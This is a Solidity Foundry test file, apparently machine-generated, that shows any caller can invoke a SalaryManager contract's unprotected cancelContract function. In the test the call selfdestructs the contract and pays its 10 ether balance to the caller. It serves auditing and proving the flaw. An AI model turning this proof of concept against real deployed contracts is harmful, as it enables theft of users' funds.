// Generation Time: 11,22s
// Input Tokens: 2718
// Output Tokens: 725
// Reasoning Tokens: 0


// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SalaryManager} from "../src/SalaryManager.sol";

contract TestAccessControlSalaryManager is Test {
    SalaryManager public _contractUnderTest;
    address private _owner;

    function setUp() public {
        _owner = address(this);
        _contractUnderTest = new SalaryManager();
        
        // Fund the contract so the cancelContract precondition can be met
        vm.deal(address(_contractUnderTest), 10 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // Constrain the 'caller'
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the owner (the only privileged role that should be able to call critical functions)
        vm.assume(caller != _owner);
        
        // Exclude the contract itself
        vm.assume(caller != address(_contractUnderTest));

        // Fund the caller to receive the selfdestruct funds
        vm.deal(caller, 1 ether);
        
        // Record the contract balance before the attack
        uint256 contractBalanceBefore = address(_contractUnderTest).balance;
        uint256 callerBalanceBefore = caller.balance;
        
        // Verify the contract has funds and the precondition for cancelContract is met
        // _totalAllocated is 0 (no salaries sent), and balance is 10 ether, so condition passes
        assertTrue(contractBalanceBefore > 0, "Contract should have balance");

        // Switch context to the arbitrary caller (unauthorized user)
        vm.prank(caller);

        // Trigger the sensitive method - cancelContract has no access control
        // If vulnerable: call succeeds, contract is destroyed, funds sent to caller
        // If secure: call reverts with access control error
        _contractUnderTest.cancelContract();

        // Assert state change - the caller received the contract's funds via selfdestruct
        uint256 callerBalanceAfter = caller.balance;
        assertEq(
            callerBalanceAfter, 
            callerBalanceBefore + contractBalanceBefore, 
            "Unauthorized caller should have received contract funds"
        );
        
        // Verify the contract was destroyed (code size is 0)
        uint256 codeSize;
        address contractAddr = address(_contractUnderTest);
        assembly {
            codeSize := extcodesize(contractAddr)
        }
        assertEq(codeSize, 0, "Contract should be destroyed");
    }
}
